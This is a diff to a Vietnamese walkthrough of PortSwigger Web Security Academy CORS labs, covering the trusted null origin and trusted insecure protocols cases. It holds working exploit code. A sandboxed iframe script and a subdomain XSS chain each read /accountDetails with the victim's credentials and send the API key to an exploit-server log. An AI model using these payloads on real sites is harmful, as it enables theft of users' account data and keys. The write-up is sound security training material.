@@ -64,9 +64,77 @@ image:
 - Khi victim truy cập vào trang web của attacker, script trên được thực thi, theo hành vi mặc định, **browser** thêm **header Origin: evil.com** vào request, trong trường hợp này:
     - Server phản hồi lại `Access-Control-Allow-Origin: evil.com` và `Access-Control-Allow-Credentials: true`
     - Vì vậy request thành công khi server chấp nhận **Origin** và **cookie** từ **browser**
-- Lấy `apikey` và submit
+- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit
 
-### 
+### CORS vulnerability with trusted null origin
+#### Analysis
+- Login bằng tài khoản được cấp 
+- Mở **Proxy** > **HTTP History** của **Burp**
+- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
+- Thêm header `Origin: https://evil.com` trong request để test server có **reflect Origin** không => Không
+- Thêm header `Origin: https://YOUR-LAB-ID.web-security-academy.net` trong request để test server có **reflect Origin** không => Có
+- Thêm header `Origin: null` trong request để test server có **reflect Origin** không => Có
+
+=> Server chấp nhận cùng **origin** và **null** trong **while list**
+#### Exploit
+- Ý tưởng: Sử dụng kỹ thuật tấn công với `Origin: null` và **iframe sandbox**
+- Tạo mã khai thác và gửi đến victim
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+    src="data:text/html,<script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','https://0ad5002f03f83ae3b5d42fbe00c30040.web-security-academy.net/accountDetails',true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            location='https://exploit-0a5000f803e43a46b5f22ed0016300f2.exploit-server.net/log?key='+this.responseText;
+        };
+    </script>">
+</iframe>
+```
+
+| Quyền                  | Tác dụng                                                               | Nguy cơ                                                                                                   |
+| ---------------------- | ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
+| `allow-scripts`        | Cho phép iframe chạy JavaScript.                                       | Nhưng **JS không được truy cập DOM cha**, và origin là `"null"` nếu sandbox không có `allow-same-origin`. |
+| `allow-top-navigation` | Cho phép iframe điều hướng top-level (thay đổi `window.top.location`). | Có thể dùng để redirect người dùng.                                                                       |
+| `allow-forms`          | Cho phép gửi form (POST, GET...).                                      | Có thể gửi request, nhưng không đọc được phản hồi nếu bị CORS chặn.                                       |
+
+- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit
+
+### CORS vulnerability with trusted insecure protocols
+#### Analysis
+- Login bằng tài khoản được cấp 
+- Mở **Proxy** > **HTTP History** của **Burp**
+- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
+- Thử thêm **header Origin** khác nhau để test hành vi của **server** => chỉ chấp nhận cùng **origin** và bất kết **scheme** nào
+- Thử khai thác thêm: 
+    - Vào 1 post bất kỳ
+    - Checkstock => xuất hiện 1 subdomain
+    - Thử khai thác XSS và thành công với payload: `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=%3Cimg%20src=1%20onerror=alert()%3E&storeId=acb`
+- Thử thay giá trị **header Origin** thành `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net` và thành công => Server chấp nhận 
+
+#### Exploit
+- Ý tưởng: Từ lỗi XSS ở subdomain, tạo script đế tấn công lấy **apikey**
+- Mã trong phần body của **Exploit Server**
+```
+<script>
+  document.location =
+    "https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=" +
+    encodeURIComponent(`<script>
+      fetch("https://0a3b002d04976b6e81260c3a00900075.web-security-academy.net/accountDetails", {credentials: "include"})
+        .then(r => r.text())
+        .then(d => {
+          fetch("https://exploit-0acf00f004266b3481b80b3b01a20006.exploit-server.net/log?key=" + encodeURIComponent(d))
+        });
+    </script>`) +
+    "&storeId=1";
+</script>
+```
+- Deliver to victim
+- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit
 
 ---
-Goodluck! 🍀🍀🍀
+Goodluck! 🍀🍀🍀 
